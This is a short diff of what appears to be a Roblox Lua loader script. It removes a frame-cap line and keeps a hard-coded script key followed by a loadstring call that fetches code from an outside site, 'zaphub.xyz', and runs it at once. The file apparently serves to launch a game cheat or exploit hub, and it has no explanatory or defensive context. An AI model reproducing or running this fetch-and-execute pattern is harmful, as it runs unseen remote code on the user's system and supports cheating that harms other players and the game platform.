@@ -1,4 +1,3 @@
-setfpscap(4)
 script_key="TdVwhWpohFRGWfEVbDSwgRifLiopOLOG";
 loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
 wait(5)
